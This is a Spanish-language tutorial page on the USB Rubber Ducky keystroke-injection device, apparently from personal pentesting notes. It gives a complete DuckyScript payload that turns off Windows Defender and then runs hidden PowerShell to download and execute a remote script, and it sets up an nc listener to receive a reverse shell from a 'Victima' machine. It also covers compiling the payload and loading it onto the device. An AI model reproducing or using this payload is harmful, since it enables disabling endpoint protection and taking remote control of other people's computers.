---
icon: duck
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Rubber Ducky

Es un USB aparentemente normal, pero en su interior tiene un hardware que simula ser un teclado, por lo que cuando se conecta a un dispositivo, este lo reconoce como un teclado y permite ejecutar scripts escribiendolo todo de forma automatica como un teclado programable a tu manera.

## <mark style="color:purple;">Explicación practica</mark>

Podremos programar el USB con su propio lenguaje de script que esta establecido en la siguiente pagina:

URL = [Pagina Script Rubber Ducky](https://payloadstudio.com/community/)

Por ejemplo cuando queramos ejecutar un script en algun equipo como por ejemplo en windows, podremos programar al USB para que cuando se inserte de forma automatica haga una serie de opciones las cuales hayamos programado, por ejemplo si queremos que desactive el firewall de windows y se ejecute un script que creara una `Reverse Shell`, podremos utilizar el siguiente script:

```txt
REM Turn off Windows Defender
REM
DELAY 1000
CTRL ESC
DELAY 400
STRING pr
ENTER
DELAY 1000
TAB
DELAY 400
TAB
DELAY 400
TAB
DELAY 400
TAB
DELAY 400
ENTER
DELAY 1000
SPACE
DELAY 400
LEFT
DELAY 400
ENTER
DELAY 400
TAB
DELAY 400
SPACE
DELAY 400
TAB
DELAY 400
SPACE
DELAY 400
TAB
DELAY 400
TAB
DELAY 400
SPACE
DELAY 400
ALT F4
DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden "IEX(New-Object Net.WebClient).downloadString('http://<IP>/PS.ps1')"
ENTER
```

Ahora solo tendremos que darle a la opcion `Default US`, darle a `Lenguage: us.json` y establecerlo como `es.json` para tener el teclado en español y que los caracteres especiales no fallen, echo esto bajaremos abajo del todo y le daremos a la opcion `Generate Payload`, lo que nos generara un archivo llamado `inject.bin` el cual sera el que tendremos que pegar en el interior del pendrive.

Para hacer esto, tendremos que abrir el pendrive la carcasa y extraer la `micro SD` que lleva conectada, mediante un USB adaptador de `micro SD` lo conectaremos al equipo para pegar en el interior de la carpeta `SD` el archivo `.bin`

Echo esto anterior desconectaremos la `SD` y la volveremos a coenctar al USB `Rubber Ducky`

Antes de conectar el USB al equipo Victima, tendremos que tener en nuestro equipo Atacante un servidor abierto para que se descargue nuestro archivo malicioso llamado `PS.ps1` de powershell que hayamos programado para objetener una `Reverse Shell`.

```shell
rlwrap nc -nvlp <PORT>
```

Con esto estaremos a la escucha junto con cualquier direccion IP establecida como `0.0.0.0`

Por lo que cuando conectemos el USB al equipo Victima, se desactivara el `Windows Defender` y se ejecutara el script para obtener acceso a la maquina Victima.

Con esto se puede hacer muchas mas cosas que una `Reverse Shell`, pero tiene sus limitaciones igualmente.
